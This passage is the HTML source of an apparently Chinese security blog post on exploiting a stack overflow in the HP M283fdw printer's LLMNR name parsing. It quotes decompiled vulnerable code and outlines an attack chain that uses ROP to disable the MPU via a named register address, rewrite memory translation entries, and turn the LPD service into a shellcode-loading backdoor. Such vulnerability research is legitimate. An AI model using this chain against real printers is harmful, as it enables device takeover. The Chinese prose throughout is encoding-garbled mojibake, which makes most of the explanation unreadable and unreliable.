&lt;p&gt;‰∏ªË¶ÅÊúÉÊòØ header Âä†‰∏ä Queries ÈÄôÁ®ÆÊ†ºÂºèÔºåCount Ë°®Á§∫‰∏çÂêåÂûãÊÖãÁöÑ query Êï∏„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/22.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÊØèÂÄã DNS Query ÈÉΩÊòØÁî±Ë®±Â§ö label ÁµÑÊàêÔºåÊØèÂÄã label ÈÉΩÊúÉÂÉè‰∏äÂúñ‰∏≠ÈÄôÊ®£ÔºåÈÉΩÊòØÈï∑Â∫¶Âä†‰∏äÂ≠ó‰∏≤ÁöÑÁµÑÂêàÔºå‰πüÊúâ &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc1035#section-4.1.4&quot;&gt;Message Compression&lt;/a&gt; Ê©üÂà∂ÔºåÈÅéÂéªÂú®ËôïÁêÜÈÄô‰∫õÂú∞ÊñπÊôÇÔºåÈùûÂ∏∏ÂÆπÊòìÂá∫ÁèæÂïèÈ°åÔºåÂú® BlackHat 2021 ÁöÑ &lt;a href=&quot;https://i.blackhat.com/asia-21/Thursday-Handouts/as-21-dosSantos-The-Cost-of-Complexity-Different-Vulnerabilities-While-Implementing-the-Same-RFC.pdf&quot;&gt;THE COST OF COMPLEXITY:Different Vulnerabilities While Implementing the Same RFC&lt;/a&gt; ‰∏≠Ôºå‰πüÊèêÂà∞‰∫ÜÈ°û‰ººÁöÑÂïèÈ°å„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;vulnerability-1&quot;&gt;Vulnerability&lt;/h4&gt;

&lt;p&gt;ÊàëÂÄëÂõûÈ†≠‰æÜÁúã‰∏Ä‰∏ã HP ÁöÑÂØ¶‰ΩúÔºö&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;llmnr_process_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(...){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;292&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;consume_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;llmnr_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;qname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,...);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ÈÄôÈÇäÂèØ‰ª•ÁúãÂà∞ HP Âú®ËôïÁêÜ LLMNR Â∞ÅÂåÖÊôÇÔºåÊúÉÂ∞á‰∏ÄÂÄãÂõ∫ÂÆö buffer ÂÇ≥ÂÖ•ÔºåÁî®‰æÜÊîæËôïÁêÜÂæåÁöÑÁµêÊûúÔºåËÄå consume_lables ÂâáÊòØ‰∏ªË¶ÅÁî®‰æÜËôïÁêÜ dns labels„ÄÇ&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;consume_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;llmnr_hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r5&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r12&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r3&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r4&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// cc&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r6&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// r0&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------------[1]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;&apos;.&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ËÄåÂú® consume_labels ‰∏≠ÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[1]&lt;/code&gt; ÊúÉÂÖàÂèñÂæó label Èï∑Â∫¶ÔºåÊé•ËëóÊ†πÊìöÂûãÊÖãÂéªËôïÁêÜÔºåËÄåÂú®&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; ÂâáÊòØËôïÁêÜ‰∏ÄËà¨Èï∑Â∫¶ÁöÑÊÉÖÊ≥ÅÔºåÊ≠§Ëôï‰∏¶&lt;strong&gt;Ê≤íÊúâÂ∞çÈï∑Â∫¶ÂÅöÊ™¢Êü•&lt;/strong&gt;ÔºåÂ∞±Áõ¥Êé•Â∞á label ÂØ´ÈÄ≤ dst buffer ‰∏≠ÔºåÂ∞éËá¥‰∫Ü stack overflowÔºåÂà∞Ê≠§ËôïÊàëÂÄëÂéü‰ª•ÁÇ∫Â∑Æ‰∏çÂ§öÁµêÊùü‰∫ÜÔºåÊé•‰∏ã‰æÜÊáâË©≤Â¶ÇÂêå Canon È°û‰ººÁöÑÊñπÊ≥ïÂ∞±ÂèØ‰ª• Exploit ‰∫Ü„ÄÇÁÑ∂ËÄåÁï∂ÊàëÂÄëÂú®ÂØ´ Exploit ÊôÇÁôºÁèæ HP ÊØî Canon Â§ö‰∫Ü‰∏Ä‰∫õ‰øùË≠∑Ê©üÂà∂„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;protection-1&quot;&gt;Protection&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;No Stack Guard&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;XN(DEP)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Memory Protect Unit (MPU)&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;No ASLR&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Âú® HP Âç∞Ë°®Ê©ü‰∏≠ÔºåÂ§ö‰∫Ü XN Âèä MPU ÁöÑË®òÊÜ∂È´î‰øùË≠∑Êé™ÊñΩÔºåÂè¶Â§ñÈÄôÂÄãÊºèÊ¥û‰πüÊúâ‰∫ÜÊõ¥Â§öÁöÑÈôêÂà∂„ÄÇÊàëÂÄë&lt;strong&gt;Âè™ËÉΩ overflow Á¥Ñ 0x100 bytes&lt;/strong&gt; Âèä&lt;strong&gt;‰∏çËÉΩÊúâ null Â≠óÂÖÉ&lt;/strong&gt;ÔºåÈÄôÂ§ßÂπÖÈôêÂà∂‰∫ÜÊàëÂÄëÁöÑ ROPÔºå‰ΩøÂæóÊàëÂÄëÊ≤íËæ¶Ê≥ïÂñÆÈù† ROP ÂÅöÂà∞ÂæåÁ∫åË°åÂãïÔºåÈúÄË¶ÅÂè¶Â§ñÊâæÂÖ∂‰ªñÁöÑÊºèÊ¥ûÊàñÂÖ∂‰ªñÊñπÊ≥ïÊâçËÉΩÈÅîÊàêÊàëÂÄëÁöÑÁõÆÊ®ô„ÄÇÂú®‰∏ÄÊÆµÊôÇÈñìÂæåÔºåÊàëÂÄëÈñãÂßãÊÄùËÄÉÔºåHP Âç∞Ë°®Ê©üÊòØÂ¶Ç‰ΩïÂéªÂØ¶‰Ωú &lt;strong&gt;XN(DEP)&lt;/strong&gt; Âèä &lt;strong&gt;MPU&lt;/strong&gt; ÁöÑ? ÊàëÂÄëÂõûÈ°ß‰∏Ä‰∏ã HP RTOS:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÊâÄÊúâ Service code Âèä Kernel Code ÈÉΩÂú®Âêå‰∏ÄÂÄã Binary ‰∏≠„ÄÇ&lt;/li&gt;
  &lt;li&gt;Â§ßÂ§öÊï∏ÁöÑ task ÈÉΩË∑ëÂú®Âêå‰∏ÄÂÄãË®òÊÜ∂È´îÁ©∫ÈñìÂ∫ï‰∏ã(Ê≤íÊúâ Process isolation)Ôºå‰πüÂπæ‰πéÈÉΩË∑ëÂú®È´òÊ¨äÈôêÊ®°Âºè&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÁúãÂÆå‰ª•‰∏äÂÖ©ÈªûÔºåÊúÉÊÉ≥Âà∞ÊòØ‰∏çÊòØÁêÜËß£ HP RTOS ‰∏≠ÁöÑ MMU Âèä MPU Â∞±ÂèØ‰ª•ÁπûÈÅéÂë¢Ôºü&lt;/p&gt;

&lt;p&gt;ÊàëÂÄë‰æÜÁúã‰∏Ä‰∏ã HP RTOS MMU Ê©üÂà∂&lt;/p&gt;

&lt;h4 id=&quot;mmu-in-hp-m283fdw&quot;&gt;MMU in HP M283fdw&lt;/h4&gt;
&lt;p&gt;Âú® HP M283fdw ‰∏≠‰ΩøÁî®ÁöÑÊòØ‰∏ÄÈöéÂ±§ÁöÑ Translation table ‰æÜÂÅö Address translation ÔºåÊØèÂÄã translation table entry ÈÉΩË°®Á§∫ 1MB ÁöÑ SectionÔºåËÄå Translation table ÂâáÊòØ&lt;strong&gt;Âõ∫ÂÆöÂú® 0x4003c000&lt;/strong&gt; ÈÄôÂÄã‰ΩçÁΩÆ‰∏ä&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/23.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÊØèÂÄã translation table entry ÈÉΩÊúÉÂ∞çÊáâÂà∞ physical address ÂèäË©≤ section ÁöÑÊ¨äÈôêÔºåCPU Â∞±ÊòØÊ†πÊìöÈÄô‰∫õÂÖßÂÆπÊ±∫ÂÆöÂü∑Ë°åÊ¨äÈôê„ÄÅË®òÊÜ∂È´îÂÖßÂÆπ‰øÆÊîπÊ¨äÈôêÔºåÂ¶ÇÊûúÊàëÂÄëÂèØ‰ª•‰øÆÊîπ translation table entry ÁöÑÂÖßÂÆπÂ∞±ÂèØ‰ª•Êõ¥ÊîπË®òÊÜ∂È´îÊ¨äÈôêÔºå‰πüÂèØ‰ª•ÈÄèÈÅéÂÆÉ‰æÜ Mapping ‰ªªÊÑè Physical addressÔºåÈÄôÈÇäË∑üÊ¨äÈôêÊúâÈóúÁöÑ‰∏ªË¶ÅÊúÉÊúâ AP APX Ë∑ü XN„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/24.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÂæûÂâçËø∞ÁöÑÊºèÊ¥û‰∏≠Ê≥®ÊÑèÂà∞ÔºåÂú®Êúâ stack overflow ‰∏î‰πüË∑ëÂú®È´òÊ¨äÈôê‰∏ãÔºåÂ∞±ÂèØÈÄöÈÅé ROP ‰øÆÊîπ translation table entryÔºå‰ΩÜÁï∂ÊàëÂÄëÂ∞çÂòóË©¶Áõ¥Êé•Â∞ç translation table ÂÅöÂØ´ÂÖ•ÂæåÔºåÁµêÊûú&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/25.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄ†ÊàêÂç∞Ë°®Ê©ü CrashÔºåÊü•‰∫Ü‰∏Ä‰∏ãÁôºÁèæÊòØ memory fault exceptionÔºå‰∏ªË¶ÅÈÄ†ÊàêÂéüÂõ†Â∞±ÊòØÂõ†ÁÇ∫ Memory Protect Unit (MPU) ÊúâÂ∞çË©≤Ë®òÊÜ∂È´îÂçÄÊÆµÂÅö‰øùË≠∑„ÄÇ&lt;/p&gt;

&lt;p&gt;Â•ΩÔºåÈÇ£ÊàëÂÄëÂ∞±‰æÜÁúãÁúã MPU ÁöÑÊ©üÂà∂„ÄÇ&lt;/p&gt;

&lt;h4 id=&quot;mpu-in-hp-m283fdw&quot;&gt;MPU in HP M283fdw&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Memory_protection_unit&quot;&gt;MPU&lt;/a&gt; ‰∏ªË¶ÅÂäüËÉΩÊòØÊää memory ÊãÜÂàÜÊàêÂ•ΩÂπæÂÄã region ‰∏¶ÂÆöÁæ©ÊØèÂÄã region ÁöÑÊ¨äÈôêÔºåËàá MMU ÊòØÂÆåÂÖ®‰∏çÂêåÁöÑÊ©üÂà∂ÔºåÂæàÂ∏∏Âá∫ÁèæÂú® IoT Ë®≠ÂÇô‰∏≠„ÄÇ
HP ÂâáÊòØÂú®ÈñãÊ©üÂ∞±ÊúÉÂïüÁî®Ôºå‰∏¶Â∞áÊØèÂÄã region ÂÆöÁæ©Â•ΩÊ¨äÈôêÔºåÂõ†Ê≠§ÁÑ°Ê≥ïËá™Â∑±Êìç‰Ωú page table„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/26.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú®Èï∑ÊôÇÈñìÈÄÜÂêëÂèäÂèÉËÄÉ &lt;a href=&quot;https://developer.arm.com/documentation/ddi0403/d/System-Level-Architecture/System-Address-Map/Protected-Memory-System-Architecture--PMSAv7/Register-support-for-PMSAv7-in-the-SCS?lang=en#BEHJFJDI&quot;&gt;ARM Manual&lt;/a&gt; ‰πãÂæåÔºåÊàëÂÄëÁôºÁèæ‰∫ãÂØ¶‰∏äÂè™Ë¶ÅÊ∏ÖÁ©∫ MPU_CTRL Â∞±ÂèØÈóúÈñâ MPUÔºåÂú®Á∂ìÈÅéÈÄÜÂêëÂæå HP M283fdw ÁöÑ MPU_CTRL ‰ΩçÁΩÆÊòØÂú® 0xE0400304ÔºåÈÄôÈÇäÁ®çÂæÆË∑ü ARM ÁöÑ spec ÊúâÈªû‰∏çÂêåÔºå‰∏çÂ§™Á¢∫ÂÆöÂéüÂõ†Â∞±ÊòØ‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/27.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h4&gt;
&lt;p&gt;Âú®‰∫ÜËß£ HP ÁöÑ MMU Âèä MPU Ê©üÂà∂ÂæåÔºåÊàëÂÄëÂèØËºïÊòìÂú∞Âà©Áî® ROP ‰æÜÈóúÈñâ MPUÔºå‰∏¶ÊàêÂäü‰øÆÊîπ translation table entryÔºåÊàëÂÄëÂèØ‰ª•‰ªªÊÑèÁöÑ‰øÆÊîπ‰ªª‰Ωï serivce ÁöÑÁ®ãÂºèÁ¢ºÔºåÈÄôÈÇäÊàëÂÄëÊúÄÂæåÈÅ∏Êìá‰∫Ü &lt;a href=&quot;https://en.wikipedia.org/wiki/Line_Printer_Daemon_protocol&quot;&gt;Line Printer Daemon(LPD)&lt;/a&gt; ÈÄôÂÄãÊúçÂãô‰æÜ‰øÆÊîπÔºåÂ∞áÂÆÉ‰øÆÊîπÊàêÂæåÈñÄ: ËÆÄÂÖ•Êõ¥Â§öÁöÑ Payload Âà∞ÊåáÂÆöÁöÑ‰ΩçÁΩÆ‰∏äÔºåÊúÄÁµÇÂü∑Ë°åÊàëÂÄëÈÄÅÈÅéÂéªÁöÑ shellcode„ÄÇ&lt;/p&gt;

